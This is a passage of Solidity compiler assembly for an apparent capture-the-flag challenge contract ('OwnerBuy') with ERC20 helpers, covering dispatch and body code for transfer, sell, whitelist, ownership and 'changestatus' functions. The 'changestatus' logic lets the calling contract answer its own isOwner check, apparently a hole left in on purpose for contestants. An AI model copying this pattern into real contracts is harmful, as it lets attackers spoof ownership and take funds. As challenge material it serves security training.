\"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n    tag_22:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_113\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_113:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n      pop\n      tag_114\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_115\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_115:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_116\n      jump\t// in\n    tag_114:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":283:304  address public _owner */\n    tag_23:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_117\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_117:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":283:304  address public _owner */\n      pop\n      tag_118\n      tag_119\n      jump\t// in\n    tag_118:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2938:3067  function setWhite(address addr) external onlyOwner returns (bool) {\r... */\n    tag_24:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_120\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_120:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2938:3067  function setWhite(address addr) external onlyOwner returns (bool) {\r... */\n      pop\n      tag_121\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_122\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_122:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2938:3067  function setWhite(address addr) external onlyOwner returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_123\n      jump\t// in\n    tag_121:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4990:5229  function finish() public onlyOwner returns (bool) {\r... */\n    tag_25:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_124\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_124:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4990:5229  function finish() public onlyOwner returns (bool) {\r... */\n      pop\n      tag_125\n      tag_126\n      jump\t// in\n    tag_125:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n    tag_26:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_127\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_127:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n      pop\n      tag_128\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_129\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_129:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_130\n      jump\t// in\n    tag_128:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4525:4982  function sell(uint256 _amount) public returns (bool success) {\r... */\n    tag_27:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_131\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_131:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4525:4982  function sell(uint256 _amount) public returns (bool success) {\r... */\n      pop\n      tag_132\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_133\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_133:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4525:4982  function sell(uint256 _amount) public returns (bool success) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_134\n      jump\t// in\n    tag_132:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1741:2016  function transferOwnership(address newOwner) public onlyOwner {\r... */\n    tag_28:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_135\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_135:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1741:2016  function transferOwnership(address newOwner) public onlyOwner {\r... */\n      pop\n      tag_136\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_137\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_137:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1741:2016  function transferOwnership(address newOwner) public onlyOwner {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_138\n      jump\t// in\n    tag_136:\n      stop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2092:2253  function lock() public onlyOwner {\r... */\n    tag_29:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_139\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_139:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2092:2253  function lock() public onlyOwner {\r... */\n      pop\n      tag_140\n      tag_141\n      jump\t// in\n    tag_140:\n      stop\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":670:753  function name() public view returns (string memory) {\r... */\n    tag_39:\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":707:720  string memory */\n      0x60\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":740:745  _name */\n      0x05\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":733:745  return _name */\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_143\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_144\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_143)\n    tag_144:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_145:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_145\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_143:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":670:753  function name() public view returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n    tag_47:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2601:2605  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2618:2654  _approve(msg.sender, spender, value) */\n      tag_147\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2627:2637  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2639:2646  spender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2648:2653  value */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2618:2626  _approve */\n      tag_148\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2618:2654  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_147:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2672:2676  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2665:2676  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1559:1650  function totalSupply() public view returns (uint256) {\r... */\n    tag_50:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1603:1610  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1630:1642  _totalSupply */\n      sload(0x04)\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1623:1642  return _totalSupply */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1559:1650  function totalSupply() public view returns (uint256) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2612:2652  mapping(address => uint256) public Times */\n    tag_54:\n      mstore(0x20, 0x09)\n      dup1\n      0x00\n      mstore\n      keccak256(0x00, 0x40)\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n    tag_58:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3244:3248  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3261:3297  _transfer(sender, recipient, amount) */\n      tag_151\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3271:3277  sender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3279:3288  recipient */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3290:3296  amount */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3261:3270  _transfer */\n      tag_152\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3261:3297  _transfer(sender, recipient, amount) */\n      jump\t// in\n    tag_151:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3308:3381  _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount)) */\n      tag_153\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3317:3323  sender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3325:3335  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3380  _allowances[sender][msg.sender].sub(amount) */\n      tag_154\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3373:3379  amount */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3348  _allowances */\n      0x03\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3356  _allowances[sender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3349:3355  sender */\n      dup11\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3356  _allowances[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3368  _allowances[sender][msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3357:3367  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3368  _allowances[sender][msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3372  _allowances[sender][msg.sender].sub */\n      tag_155\n      swap1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3337:3380  _allowances[sender][msg.sender].sub(amount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_154:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3308:3316  _approve */\n      tag_148\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3308:3381  _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount)) */\n      jump\t// in\n    tag_153:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3399:3403  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3392:3403  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":1522:1605  function decimals() public view returns (uint8) {\r... */\n    tag_61:\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":1563:1568  uint8 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":1588:1597  _decimals */\n      0x07\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":1581:1597  return _decimals */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":1522:1605  function decimals() public view returns (uint8) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n    tag_65:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3900:3904  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3917:3996  _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue)) */\n      tag_158\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3926:3936  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3938:3945  spender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3995  _allowances[msg.sender][spender].add(addedValue) */\n      tag_159\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3984:3994  addedValue */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3958  _allowances */\n      0x03\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3970  _allowances[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3959:3969  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3970  _allowances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3979  _allowances[msg.sender][spender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3971:3978  spender */\n      dup10\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3979  _allowances[msg.sender][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3983  _allowances[msg.sender][spender].add */\n      tag_160\n      swap1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3947:3995  _allowances[msg.sender][spender].add(addedValue) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_159:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3917:3925  _approve */\n      tag_148\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3917:3996  _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue)) */\n      jump\t// in\n    tag_158:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4014:4018  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4007:4018  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3075:3207  function unsetWhite(address addr) external onlyOwner returns (bool) {\r... */\n    tag_69:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3137:3141  bool */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1028:1038  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1024  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1010:1075  require(_owner == msg.sender, \"Ownable: caller is not the owner\") */\n      tag_162\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x20\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_162:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3172:3177  false */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3154:3163  whiteList */\n      0x0a\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3154:3169  whiteList[addr] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3164:3168  addr */\n      dup5\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3154:3169  whiteList[addr] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3154:3177  whiteList[addr] = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3195:3199  true */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3188:3199  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3075:3207  function unsetWhite(address addr) external onlyOwner returns (bool) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3640:3842  function changestatus(address _owner) public {\r... */\n    tag_73:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3696:3708  Changing tmp */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3720:3730  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3696:3731  Changing tmp = Changing(msg.sender) */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3747:3750  tmp */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3747:3758  tmp.isOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2f54bf6e\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3759:3765  _owner */\n      dup4\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3747:3766  tmp.isOwner(_owner) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_165\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_165:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3747:3766  tmp.isOwner(_owner) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_166\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_166:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3747:3766  tmp.isOwner(_owner) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_167\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_167:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3747:3766  tmp.isOwner(_owner) */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3742:3835  if 